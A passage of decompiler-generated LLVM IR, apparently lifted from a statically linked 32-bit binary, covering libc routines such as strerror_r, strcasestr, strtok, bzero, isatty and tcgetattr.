  %v1_8060bca = add i32 %v0_8060bd648, 1
  %v2_8060bca = inttoptr i32 %v1_8060bca to i8*
  %v3_8060bca = load i8, i8* %v2_8060bca, align 1
  %v16_8060bca = icmp eq i8 %v3_8060bca, %v3_8060bc7
  store i32 %v4_8060bc7, i32* @ecx, align 4
  %v1_8060bd0 = icmp eq i1 %v16_8060bca, false
  br i1 %v1_8060bd0, label %dec_label_pc_8060be4, label %dec_label_pc_8060bd2

dec_label_pc_8060bd2:                             ; preds = %dec_label_pc_8060bc7
  %v4_8060bd2 = icmp eq i8 %v3_8060bc7, 0
  br i1 %v4_8060bd2, label %dec_label_pc_8060bee, label %dec_label_pc_8060bd6

dec_label_pc_8060bd6:                             ; preds = %dec_label_pc_8060bd2
  %v1_8060bd6 = add i32 %v0_8060bd648, 2
  %v1_8060bd9 = add i32 %v0_8060bd949, 2
  %v1_8060bdc = inttoptr i32 %v1_8060bd9 to i8*
  %v2_8060bdc = load i8, i8* %v1_8060bdc, align 1
  %v3_8060bdc = zext i8 %v2_8060bdc to i32
  store i32 %v3_8060bdc, i32* @ecx, align 4
  %v1_8060bdf = inttoptr i32 %v1_8060bd6 to i8*
  %v2_8060bdf = load i8, i8* %v1_8060bdf, align 1
  %v12_8060bbf = icmp eq i8 %v2_8060bdf, %v2_8060bdc
  %v1_8060bc1 = icmp eq i1 %v12_8060bbf, false
  br i1 %v1_8060bc1, label %dec_label_pc_8060be4, label %dec_label_pc_8060bc3

dec_label_pc_8060be4:                             ; preds = %dec_label_pc_8060bd6, %dec_label_pc_8060bc7, %dec_label_pc_8060ba8
  %v0_8060be4 = phi i32 [ %v4_8060bb6, %dec_label_pc_8060ba8 ], [ %v4_8060bc7, %dec_label_pc_8060bc7 ], [ %v3_8060bdc, %dec_label_pc_8060bd6 ]
  %v1_8060be4 = icmp eq i32 %v0_8060be4, 0
  %v1_8060be6 = icmp eq i1 %v1_8060be4, false
  br i1 %v1_8060be6, label %dec_label_pc_8060b7c, label %dec_label_pc_8060bee

dec_label_pc_8060bec:                             ; preds = %dec_label_pc_8060b4d, %dec_label_pc_8060b93, %dec_label_pc_8060b85
  %v2_8060bef29 = phi i32 [ %v1_8060b5f, %dec_label_pc_8060b85 ], [ %v1_8060b5f, %dec_label_pc_8060b93 ], [ %tmp33, %dec_label_pc_8060b4d ]
  br label %dec_label_pc_8060bee

dec_label_pc_8060bee:                             ; preds = %dec_label_pc_8060be4, %dec_label_pc_8060bc3, %dec_label_pc_8060bd2, %entry, %dec_label_pc_8060b5f, %dec_label_pc_8060bec
  %v2_8060bef = phi i32 [ %v2_8060bef29, %dec_label_pc_8060bec ], [ %v1_8060b5f, %dec_label_pc_8060b5f ], [ %tmp33, %entry ], [ %v1_8060b5f, %dec_label_pc_8060bd2 ], [ %v1_8060b5f, %dec_label_pc_8060bc3 ], [ %v1_8060b5f, %dec_label_pc_8060be4 ]
  %storemerge1 = phi i32 [ 0, %dec_label_pc_8060bec ], [ %v1_8060b4d, %dec_label_pc_8060b5f ], [ %arg1, %entry ], [ %v1_8060bb3, %dec_label_pc_8060bd2 ], [ %v1_8060bb3, %dec_label_pc_8060bc3 ], [ %v1_8060bb3, %dec_label_pc_8060be4 ]
  store i32 %v2_8060bef, i32* @ecx, align 4
  store i32 %v0_8060b33, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v3_8060bdc, { 0, 2, 1 }
  uselistorder i32 %v1_8060bd9, { 1, 0 }
  uselistorder i32 %v1_8060bd6, { 1, 0 }
  uselistorder i8 %v3_8060bc7, { 1, 0, 2 }
  uselistorder i32 %v0_8060bd648, { 1, 0 }
  uselistorder i32 %v0_8060bd949, { 1, 0 }
  uselistorder i8 %storemerge.in, { 1, 0 }
  uselistorder i8* %storemerge.in.in, { 1, 0 }
  uselistorder i32 %v0_8060bba, { 3, 2, 4, 1, 0 }
  uselistorder i8 %v2_8060b98, { 1, 0 }
  uselistorder i32 %v1_8060b97, { 0, 2, 1 }
  uselistorder i8 %v2_8060b8a, { 1, 0, 2 }
  uselistorder i32 %v0_8060b8956, { 1, 0 }
  uselistorder i32 %v1_8060b5f, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 %v1_8060b4d, { 0, 2, 1 }
  uselistorder i32 %tmp33, { 1, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8060bee, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8060bec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8060bc3, { 1, 0 }
  uselistorder label %dec_label_pc_8060ba3, { 1, 0 }
  uselistorder label %dec_label_pc_8060b85, { 1, 0 }
  uselistorder label %dec_label_pc_8060b9b.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8060c09 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8060c11 = load i32, i32* @ebx, align 4
  ret i32 %v0_8060c11
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i8*, align 4
  %stack_var_-17 = alloca i32, align 4
  %v0_8060c19 = load i32, i32* @edi, align 4
  %v0_8060c1a = load i32, i32* @esi, align 4
  %v0_8060c1b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v6_8060c2a = icmp ugt i32 %arg1, 124
  br i1 %v6_8060c2a, label %dec_label_pc_8060c56, label %dec_label_pc_8060c2c

dec_label_pc_8060c2c:                             ; preds = %entry
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806ef84.1587, i32 0, i32 0), i8** %stack_var_-88, align 4
  %v1_8060c477 = icmp eq i32 %arg1, 0
  %v1_8060c4914 = icmp eq i1 %v1_8060c477, false
  br i1 %v1_8060c4914, label %dec_label_pc_8060c38, label %dec_label_pc_8060c4b

dec_label_pc_8060c38:                             ; preds = %dec_label_pc_8060c2c, %dec_label_pc_8060c38
  %v0_8060c3f = phi i32 [ %v3_8060c3f, %dec_label_pc_8060c38 ], [ %arg1, %dec_label_pc_8060c2c ]
  %v4_8060c3818 = phi i32 [ %v1_8060c42, %dec_label_pc_8060c38 ], [ ptrtoint ([8 x i8]* @global_var_806ef84.1587 to i32), %dec_label_pc_8060c2c ]
  %v3_8060c3817 = phi i8* [ %v5_8060c43, %dec_label_pc_8060c38 ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806ef84.1587, i32 0, i32 0), %dec_label_pc_8060c2c ]
  %v2_8060c3c = load i8, i8* %v3_8060c3817, align 1
  %v7_8060c3c = icmp eq i8 %v2_8060c3c, 0
  %v2_8060c3f = zext i1 %v7_8060c3c to i32
  %v3_8060c3f = add i32 %v2_8060c3f, %v0_8060c3f
  %v16_8060c3f = icmp eq i32 %v3_8060c3f, 0
  %v1_8060c42 = add i32 %v4_8060c3818, 1
  %v5_8060c43 = inttoptr i32 %v1_8060c42 to i8*
  %v1_8060c49 = icmp eq i1 %v16_8060c3f, false
  br i1 %v1_8060c49, label %dec_label_pc_8060c38, label %dec_label_pc_8060c47.dec_label_pc_8060c4b_crit_edge

dec_label_pc_8060c47.dec_label_pc_8060c4b_crit_edge: ; preds = %dec_label_pc_8060c38
  store i8* %v5_8060c43, i8** %stack_var_-88, align 4
  br label %dec_label_pc_8060c4b

dec_label_pc_8060c4b:                             ; preds = %dec_label_pc_8060c47.dec_label_pc_8060c4b_crit_edge, %dec_label_pc_8060c2c
  %v3_8060c95423 = phi i32 [ %v1_8060c42, %dec_label_pc_8060c47.dec_label_pc_8060c4b_crit_edge ], [ ptrtoint ([8 x i8]* @global_var_806ef84.1587 to i32), %dec_label_pc_8060c2c ]
  store i32 0, i32* @ebp, align 4
  %v1_8060c51 = inttoptr i32 %v3_8060c95423 to i8*
  %v2_8060c51 = load i8, i8* %v1_8060c51, align 1
  %v3_8060c51 = icmp eq i8 %v2_8060c51, 0
  %v1_8060c54 = icmp eq i1 %v3_8060c51, false
  br i1 %v1_8060c54, label %dec_label_pc_8060c4b.dec_label_pc_8060c85_crit_edge, label %dec_label_pc_8060c56

dec_label_pc_8060c4b.dec_label_pc_8060c85_crit_edge: ; preds = %dec_label_pc_8060c4b
  %.pre30 = bitcast i8** %stack_var_-88 to i32*
  br label %dec_label_pc_8060c85

dec_label_pc_8060c56:                             ; preds = %dec_label_pc_8060c4b, %entry
  %v1_8060c59 = ashr i32 %arg1, 31
  store i32 ptrtoint ([15 x i8]* @global_var_806ef74.1588 to i32), i32* @esi, align 4
  %v6_8060c6a = bitcast i32* %stack_var_-17 to i8*
  %v7_8060c6a = call i32 @_uintmaxtostr(i8* %v6_8060c6a, i32 %arg1, i32 %v1_8060c59, i32 -10, i32 0)
  %v1_8060c6f = add i32 %v7_8060c6a, -14
  %v5_8060c72 = inttoptr i32 %v1_8060c6f to i8*
  store i8* %v5_8060c72, i8** %stack_var_-88, align 4
  store i32 %v1_8060c6f, i32* %edi.global-to-local, align 4
  %v4_8060c78 = inttoptr i32 %v1_8060c6f to i32*
  store i32 1852534357, i32* %v4_8060c78, align 4
  %v5_8060c78 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060c78 = load i32, i32* @esi, align 4
  %v7_8060c78 = load i1, i1* @df, align 1
  %v8_8060c78 = select i1 %v7_8060c78, i32 -4, i32 4
  %v9_8060c78 = add i32 %v8_8060c78, %v5_8060c78
  %v10_8060c78 = add i32 %v8_8060c78, %v6_8060c78
  store i32 %v9_8060c78, i32* %edi.global-to-local, align 4
  store i32 %v10_8060c78, i32* %esi.global-to-local, align 4
  %v1_8060c79 = inttoptr i32 %v10_8060c78 to i32*
  %v2_8060c79 = load i32, i32* %v1_8060c79, align 4
  %v4_8060c79 = inttoptr i32 %v9_8060c78 to i32*
  store i32 %v2_8060c79, i32* %v4_8060c79, align 4
  %v5_8060c79 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060c79 = load i32, i32* %esi.global-to-local, align 4
  %v9_8060c79 = add i32 %v5_8060c79, %v8_8060c78
  %v10_8060c79 = add i32 %v6_8060c79, %v8_8060c78
  store i32 %v9_8060c79, i32* %edi.global-to-local, align 4
  store i32 %v10_8060c79, i32* %esi.global-to-local, align 4
  %v1_8060c7a = inttoptr i32 %v10_8060c79 to i32*
  %v2_8060c7a = load i32, i32* %v1_8060c7a, align 4
  %v4_8060c7a = inttoptr i32 %v9_8060c79 to i32*
  store i32 %v2_8060c7a, i32* %v4_8060c7a, align 4
  %v5_8060c7a = load i32, i32* %edi.global-to-local, align 4
  %v6_8060c7a = load i32, i32* %esi.global-to-local, align 4
  %v9_8060c7a = add i32 %v5_8060c7a, %v8_8060c78
  %v10_8060c7a = add i32 %v6_8060c7a, %v8_8060c78
  store i32 %v9_8060c7a, i32* %edi.global-to-local, align 4
  store i32 %v10_8060c7a, i32* %esi.global-to-local, align 4
  %v1_8060c7b = inttoptr i32 %v10_8060c7a to i16*
  %v2_8060c7b = load i16, i16* %v1_8060c7b, align 2
  %v4_8060c7b = inttoptr i32 %v9_8060c7a to i16*
  store i16 %v2_8060c7b, i16* %v4_8060c7b, align 2
  %v6_8060c7b = load i32, i32* %esi.global-to-local, align 4
  %v8_8060c7b = select i1 %v7_8060c78, i32 -2, i32 2
  %v10_8060c7b = add i32 %v6_8060c7b, %v8_8060c7b
  store i32 %v10_8060c7b, i32* %esi.global-to-local, align 4
  store i32 22, i32* @ebp, align 4
  %v1_8060c8f.pre = load i32, i32* @ebx, align 4
  %.phi.trans.insert = bitcast i8** %stack_var_-88 to i32*
  %v3_8060c954.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_8060c85

dec_label_pc_8060c85:                             ; preds = %dec_label_pc_8060c4b.dec_label_pc_8060c85_crit_edge, %dec_label_pc_8060c56
  %.pre-phi = phi i32* [ %.pre30, %dec_label_pc_8060c4b.dec_label_pc_8060c85_crit_edge ], [ %.phi.trans.insert, %dec_label_pc_8060c56 ]
  %v3_8060c954 = phi i32 [ %v3_8060c95423, %dec_label_pc_8060c4b.dec_label_pc_8060c85_crit_edge ], [ %v3_8060c954.pre, %dec_label_pc_8060c56 ]
  %v1_8060c8f = phi i32 [ %arg3, %dec_label_pc_8060c4b.dec_label_pc_8060c85_crit_edge ], [ %v1_8060c8f.pre, %dec_label_pc_8060c56 ]
  %v4_8060c85 = icmp eq i32 %arg2, 0
  %v3_8060c8f = select i1 %v4_8060c85, i32 0, i32 %v1_8060c8f
  %v0_8060c99.cast = inttoptr i32 %v3_8060c954 to i8*
  %v3_8060c99 = call i32 @strlen(i8* %v0_8060c99.cast)
  %v1_8060ca1 = add i32 %v3_8060c99, 1
  %tmp51 = icmp ule i32 %v1_8060ca1, %v3_8060c8f
  %v5_8060ca6 = select i1 %tmp51, i32 %v1_8060ca1, i32 %v3_8060c8f
  store i32 %v5_8060ca6, i32* @esi, align 4
  %v3_8060cae = load i32, i32* @ebp, align 4
  %v5_8060cae = select i1 %tmp51, i32 %v3_8060cae, i32 34
  %v1_8060cb1 = icmp eq i32 %v5_8060ca6, 0
  br i1 %v1_8060cb1, label %dec_label_pc_8060cd0, label %dec_label_pc_8060cb5

dec_label_pc_8060cb5:                             ; preds = %dec_label_pc_8060c85
  %v3_8060cb75 = load i32, i32* %.pre-phi, align 4
  %v8_8060cbb = inttoptr i32 %arg2 to i8*
  %v6_8060cbf = call i32 @memcpy(i8* %v8_8060cbb, i32 %v3_8060cb75, i32 %v5_8060ca6)
  %v2_8060ccb = add i32 %arg2, -1
  %v3_8060ccb = add i32 %v2_8060ccb, %v5_8060ca6
  %v4_8060ccb = inttoptr i32 %v3_8060ccb to i8*
  store i8 0, i8* %v4_8060ccb, align 1
  br label %dec_label_pc_8060cd0

dec_label_pc_8060cd0:                             ; preds = %dec_label_pc_8060c85, %dec_label_pc_8060cb5
  %v1_8060cd0 = icmp eq i32 %v5_8060cae, 0
  br i1 %v1_8060cd0, label %dec_label_pc_8060cdc, label %dec_label_pc_8060cd4

dec_label_pc_8060cd4:                             ; preds = %dec_label_pc_8060cd0
  store i32 %v5_8060cae, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8060cdc

dec_label_pc_8060cdc:                             ; preds = %dec_label_pc_8060cd0, %dec_label_pc_8060cd4
  store i32 %v0_8060c1b, i32* @ebx, align 4
  store i32 %v0_8060c1a, i32* %esi.global-to-local, align 4
  store i32 %v0_8060c19, i32* %edi.global-to-local, align 4
  ret i32 %v5_8060cae

; uselistorder directives
  uselistorder i32 %v5_8060cae, { 2, 0, 1 }
  uselistorder i1 %tmp51, { 1, 0 }
  uselistorder i32 %v1_8060ca1, { 1, 0 }
  uselistorder i32 %v3_8060c95423, { 1, 0 }
  uselistorder i32 %v1_8060c42, { 0, 2, 1 }
  uselistorder i32 %v3_8060c3f, { 1, 0 }
  uselistorder i8** %stack_var_-88, { 1, 4, 0, 2, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_806ef84.1587 to i32), { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8060cdc, { 1, 0 }
  uselistorder label %dec_label_pc_8060cd0, { 1, 0 }
  uselistorder label %dec_label_pc_8060c85, { 1, 0 }
  uselistorder label %dec_label_pc_8060c38, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8060cf8 = inttoptr i32 %arg2 to i8*
  %v3_8060cf8 = call i32 @memmove(i8* %v2_8060cf8, i32 %arg1)
  ret i32 %v3_8060cf8
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8060d0d = inttoptr i32 %arg1 to i8*
  %v4_8060d0d = call i32 @__GI_memset(i8* %v3_8060d0d, i32 0, i32 %arg2)
  ret i32 %v4_8060d0d
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8060d1b = load i32, i32* @ebx, align 4
  %v4_8060d1f = ptrtoint i8* %arg1 to i32
  %v1_8060d2b18 = inttoptr i32 %arg2 to i8*
  %v2_8060d2b1932 = load i8, i8* %v1_8060d2b18, align 1
  %v4_8060d2d2336 = icmp eq i8 %v2_8060d2b1932, 0
  %v1_8060d2f2538 = icmp eq i1 %v4_8060d2d2336, false
  br i1 %v1_8060d2f2538, label %dec_label_pc_8060d35.lr.ph.lr.ph, label %dec_label_pc_8060d65

dec_label_pc_8060d35.lr.ph.lr.ph:                 ; preds = %entry
  %v3_8060d2b2033 = zext i8 %v2_8060d2b1932 to i32
  %v4_8060d2b.pre.pre = load i32, i32* @eax, align 4
  %v5_8060d2b2134 = and i32 %v4_8060d2b.pre.pre, -256
  %v6_8060d2b2235 = or i32 %v3_8060d2b2033, %v5_8060d2b2134
  %v4_8060d35.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8060d35.lr.ph

dec_label_pc_8060d35.lr.ph:                       ; preds = %dec_label_pc_8060d35.lr.ph.lr.ph, %dec_label_pc_8060d60
  %v4_8060d35.pre = phi i32 [ %v4_8060d35.pre.pre, %dec_label_pc_8060d35.lr.ph.lr.ph ], [ %v0_8060d3f, %dec_label_pc_8060d60 ]
  %v6_8060d2b2241 = phi i32 [ %v6_8060d2b2235, %dec_label_pc_8060d35.lr.ph.lr.ph ], [ %v6_8060d2b22, %dec_label_pc_8060d60 ]
  %v2_8060d2b1940 = phi i8 [ %v2_8060d2b1932, %dec_label_pc_8060d35.lr.ph.lr.ph ], [ %v2_8060d2b19, %dec_label_pc_8060d60 ]
  %v0_8060d6039 = phi i32 [ %v4_8060d1f, %dec_label_pc_8060d35.lr.ph.lr.ph ], [ %v1_8060d60, %dec_label_pc_8060d60 ]
  br label %dec_label_pc_8060d35

dec_label_pc_8060d35:                             ; preds = %dec_label_pc_8060d35.lr.ph, %dec_label_pc_8060d55
  %v4_8060d35 = phi i32 [ %v4_8060d35.pre, %dec_label_pc_8060d35.lr.ph ], [ %v4_8060d3546, %dec_label_pc_8060d55 ]
  %v6_8060d2b30 = phi i32 [ %v6_8060d2b2241, %dec_label_pc_8060d35.lr.ph ], [ %v6_8060d2b, %dec_label_pc_8060d55 ]
  %v2_8060d2b29 = phi i8 [ %v2_8060d2b1940, %dec_label_pc_8060d35.lr.ph ], [ %v2_8060d2b, %dec_label_pc_8060d55 ]
  %v1_8060d2b28 = phi i8* [ %v1_8060d2b18, %dec_label_pc_8060d35.lr.ph ], [ %v1_8060d2b, %dec_label_pc_8060d55 ]
  %v0_8060d5527 = phi i32 [ %arg2, %dec_label_pc_8060d35.lr.ph ], [ %v1_8060d55, %dec_label_pc_8060d55 ]
  %v0_8060d5626 = phi i32 [ %v0_8060d6039, %dec_label_pc_8060d35.lr.ph ], [ %v1_8060d56, %dec_label_pc_8060d55 ]
  %v1_8060d35 = inttoptr i32 %v0_8060d5626 to i8*
  %v2_8060d35 = load i8, i8* %v1_8060d35, align 1
  %v3_8060d35 = zext i8 %v2_8060d35 to i32
  %v5_8060d35 = and i32 %v4_8060d35, -256
  %v6_8060d35 = or i32 %v5_8060d35, %v3_8060d35
  %v15_8060d37 = icmp eq i8 %v2_8060d2b29, %v2_8060d35
  br i1 %v15_8060d37, label %dec_label_pc_8060d55, label %dec_label_pc_8060d3f

dec_label_pc_8060d3f:                             ; preds = %dec_label_pc_8060d35
  %v0_8060d3f = load i32, i32* bitcast (i32** @global_var_8071afc.1590 to i32*), align 4
  %v2_8060d45 = load i8, i8* %v1_8060d35, align 1
  %v3_8060d45 = zext i8 %v2_8060d45 to i32
  %v2_8060d48 = load i8, i8* %v1_8060d2b28, align 1
  %v3_8060d48 = zext i8 %v2_8060d48 to i32
  %v2_8060d4b = mul nuw nsw i32 %v3_8060d45, 2
  %v3_8060d4b = add i32 %v2_8060d4b, %v0_8060d3f
  %v4_8060d4b = inttoptr i32 %v3_8060d4b to i16*
  %v5_8060d4b = load i16, i16* %v4_8060d4b, align 2
  %v6_8060d4b = zext i16 %v5_8060d4b to i32
  %v4_8060d4f = mul nuw nsw i32 %v3_8060d48, 2
  %v5_8060d4f = add i32 %v4_8060d4f, %v0_8060d3f
  %v6_8060d4f = inttoptr i32 %v5_8060d4f to i16*
  %v7_8060d4f = load i16, i16* %v6_8060d4f, align 2
  %v18_8060d4f = icmp eq i16 %v5_8060d4b, %v7_8060d4f
  %v1_8060d53 = icmp eq i1 %v18_8060d4f, false
  br i1 %v1_8060d53, label %dec_label_pc_8060d59, label %dec_label_pc_8060d55

dec_label_pc_8060d55:                             ; preds = %dec_label_pc_8060d3f, %dec_label_pc_8060d35
  %v4_8060d3546 = phi i32 [ %v0_8060d3f, %dec_label_pc_8060d3f ], [ %v6_8060d35, %dec_label_pc_8060d35 ]
  %v4_8060d2b6 = phi i32 [ %v6_8060d4b, %dec_label_pc_8060d3f ], [ %v6_8060d2b30, %dec_label_pc_8060d35 ]
  %v1_8060d55 = add i32 %v0_8060d5527, 1
  %v1_8060d56 = add i32 %v0_8060d5626, 1
  %v1_8060d2b = inttoptr i32 %v1_8060d55 to i8*
  %v2_8060d2b = load i8, i8* %v1_8060d2b, align 1
  %v3_8060d2b = zext i8 %v2_8060d2b to i32
  %v5_8060d2b = and i32 %v4_8060d2b6, -256
  %v6_8060d2b = or i32 %v3_8060d2b, %v5_8060d2b
  %v4_8060d2d = icmp eq i8 %v2_8060d2b, 0
  %v1_8060d2f = icmp eq i1 %v4_8060d2d, false
  br i1 %v1_8060d2f, label %dec_label_pc_8060d35, label %dec_label_pc_8060d65

dec_label_pc_8060d59:                             ; preds = %dec_label_pc_8060d3f
  %v4_8060d59 = icmp eq i8 %v2_8060d35, 0
  br i1 %v4_8060d59, label %dec_label_pc_8060d63, label %dec_label_pc_8060d60

dec_label_pc_8060d60:                             ; preds = %dec_label_pc_8060d59
  %v1_8060d60 = add i32 %v0_8060d6039, 1
  %v2_8060d2b19 = load i8, i8* %v1_8060d2b18, align 1
  %v3_8060d2b20 = zext i8 %v2_8060d2b19 to i32
  %v5_8060d2b21 = and i32 %v6_8060d4b, 65280
  %v6_8060d2b22 = or i32 %v3_8060d2b20, %v5_8060d2b21
  %v4_8060d2d23 = icmp eq i8 %v2_8060d2b19, 0
  %v1_8060d2f25 = icmp eq i1 %v4_8060d2d23, false
  br i1 %v1_8060d2f25, label %dec_label_pc_8060d35.lr.ph, label %dec_label_pc_8060d65

dec_label_pc_8060d63:                             ; preds = %dec_label_pc_8060d59
  br label %dec_label_pc_8060d65

dec_label_pc_8060d65:                             ; preds = %dec_label_pc_8060d60, %entry, %dec_label_pc_8060d55, %dec_label_pc_8060d63
  %storemerge = phi i32 [ 0, %dec_label_pc_8060d63 ], [ %v4_8060d1f, %entry ], [ %v1_8060d60, %dec_label_pc_8060d60 ], [ %v0_8060d6039, %dec_label_pc_8060d55 ]
  store i32 %v0_8060d1b, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8060d2b19, { 1, 2, 0 }
  uselistorder i8 %v2_8060d2b, { 1, 2, 0 }
  uselistorder i8* %v1_8060d2b, { 1, 0 }
  uselistorder i32 %v0_8060d3f, { 1, 2, 3, 0 }
  uselistorder i8 %v2_8060d35, { 1, 0, 2 }
  uselistorder i32 %v0_8060d5626, { 1, 0 }
  uselistorder i8 %v2_8060d2b1932, { 0, 2, 1 }
  uselistorder i8* %v1_8060d2b18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060d65, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8060d35, { 1, 0 }
  uselistorder label %dec_label_pc_8060d35.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8060d7c = inttoptr i32 %arg1 to i8*
  %v4_8060d7c = call i32 @strtok_r(i8* %v3_8060d7c, i32 %arg2, i32 ptrtoint (i32* @global_var_8077b90.1591 to i32))
  ret i32 %v4_8060d7c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8060d94 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8060d99 = icmp eq i32 %v3_8060d94, 0
  %v1_8060d9b = zext i1 %v1_8060d99 to i32
  ret i32 %v1_8060d9b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8060da8 = load i32, i32* @edi, align 4
  %v0_8060da9 = load i32, i32* @esi, align 4
  store i32 %v0_8060da9, i32* %stack_var_-8, align 4
  %v2_8060dad = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8060dad, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @edi, align 4
  %v3_8060dbf = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_8060dad)
  %v4_8060dbf = trunc i32 %v3_8060dbf to i8
  store i32 %v3_8060dbf, i32* %eax.global-to-local, align 4
  %v2_8060dc7 = icmp eq i8 %v4_8060dbf, 0
  %sext = mul i32 %v3_8060dbf, 16777216
  %v1_8060dc9 = sdiv i32 %sext, 16777216
  store i32 %v1_8060dc9, i32* %edx.global-to-local, align 4
  %v1_8060dcb = icmp eq i1 %v2_8060dc7, false
  br i1 %v1_8060dcb, label %dec_label_pc_8060e03, label %dec_label_pc_8060dcd

dec_label_pc_8060dcd:                             ; preds = %entry
  %v3_8060dcd = load i32, i32* %stack_var_-44, align 4
  %v2_8060dd1 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8060dd1, i32* %esi.global-to-local, align 4
  %v1_8060dd5 = load i32, i32* @edi, align 4
  %v2_8060dd5 = inttoptr i32 %v1_8060dd5 to i32*
  store i32 %v3_8060dcd, i32* %v2_8060dd5, align 4
  %v1_8060ddb = load i32, i32* @edi, align 4
  %v2_8060ddb = add i32 %v1_8060ddb, 4
  %v3_8060ddb = inttoptr i32 %v2_8060ddb to i32*
  %v1_8060de2 = load i32, i32* @edi, align 4
  %v2_8060de2 = add i32 %v1_8060de2, 8
  %v3_8060de2 = inttoptr i32 %v2_8060de2 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8060de9 = load i32, i32* @edi, align 4
  %v2_8060de9 = add i32 %v1_8060de9, 12
  %v3_8060de9 = inttoptr i32 %v2_8060de9 to i32*
  store i32 %tmp3, i32* %v3_8060de9, align 4
  %v4_8060dec = zext i8 %tmp to i32
  %v5_8060dec = load i32, i32* %eax.global-to-local, align 4
  %v6_8060dec = and i32 %v5_8060dec, -256
  %v7_8060dec = or i32 %v6_8060dec, %v4_8060dec
  store i32 %v7_8060dec, i32* %eax.global-to-local, align 4
  %v2_8060df0 = load i32, i32* @edi, align 4
  %v3_8060df0 = add i32 %v2_8060df0, 16
  %v4_8060df0 = inttoptr i32 %v3_8060df0 to i8*
  store i8 %tmp, i8* %v4_8060df0, align 1
  %v0_8060df3 = load i32, i32* @edi, align 4
  %v1_8060df3 = add i32 %v0_8060df3, 17
  store i32 %v1_8060df3, i32* %edi.global-to-local, align 4
  %v2_8060df6 = load i32, i32* %stack_var_-27, align 4
  %v4_8060df6 = inttoptr i32 %v1_8060df3 to i32*
  store i32 %v2_8060df6, i32* %v4_8060df6, align 4
  %v5_8060df6 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060df6 = load i32, i32* %esi.global-to-local, align 4
  %v7_8060df6 = load i1, i1* @df, align 1
  %v8_8060df6 = select i1 %v7_8060df6, i32 -4, i32 4
  %v9_8060df6 = add i32 %v8_8060df6, %v5_8060df6
  %v10_8060df6 = add i32 %v8_8060df6, %v6_8060df6
  store i32 %v9_8060df6, i32* %edi.global-to-local, align 4
  store i32 %v10_8060df6, i32* %esi.global-to-local, align 4
  %v1_8060df7 = inttoptr i32 %v10_8060df6 to i32*
  %v2_8060df7 = load i32, i32* %v1_8060df7, align 4
  %v4_8060df7 = inttoptr i32 %v9_8060df6 to i32*
  store i32 %v2_8060df7, i32* %v4_8060df7, align 4
  %v5_8060df7 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060df7 = load i32, i32* %esi.global-to-local, align 4
  %v9_8060df7 = add i32 %v5_8060df7, %v8_8060df6
  %v10_8060df7 = add i32 %v6_8060df7, %v8_8060df6
  store i32 %v9_8060df7, i32* %edi.global-to-local, align 4
  store i32 %v10_8060df7, i32* %esi.global-to-local, align 4
  %v1_8060df8 = inttoptr i32 %v10_8060df7 to i32*
  %v2_8060df8 = load i32, i32* %v1_8060df8, align 4
  %v4_8060df8 = inttoptr i32 %v9_8060df7 to i32*
  store i32 %v2_8060df8, i32* %v4_8060df8, align 4
  %v5_8060df8 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060df8 = load i32, i32* %esi.global-to-local, align 4
  %v9_8060df8 = add i32 %v5_8060df8, %v8_8060df6
